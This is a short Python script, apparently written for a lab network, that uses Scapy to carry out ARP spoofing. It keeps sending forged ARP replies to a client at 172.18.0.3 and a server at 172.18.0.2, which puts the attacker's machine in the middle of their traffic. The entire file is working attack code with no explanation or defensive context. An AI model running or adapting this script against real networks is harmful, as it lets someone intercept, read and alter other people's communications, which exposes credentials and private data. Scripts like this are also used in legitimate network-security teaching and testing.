from scapy.all import ARP, Ether, sendp, get_if_hwaddr
import time

IFACE = "eth0"
IP_CLIENTE = "172.18.0.3"
IP_SERVIDOR = "172.18.0.2"
MAC_MITM = get_if_hwaddr(IFACE)
BROADCAST = "ff:ff:ff:ff:ff:ff"

def poison(target_ip, spoof_ip):
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=MAC_MITM)
    eth = Ether(dst=BROADCAST, src=MAC_MITM)
    sendp(eth/arp, iface=IFACE, verbose=0)

print(f"[+] MITM MAC: {MAC_MITM}")
try:
    while True:
        poison(IP_CLIENTE, IP_SERVIDOR)
        poison(IP_SERVIDOR, IP_CLIENTE)
        time.sleep(2)
except KeyboardInterrupt:
    print("Deteniendo spoofing...")
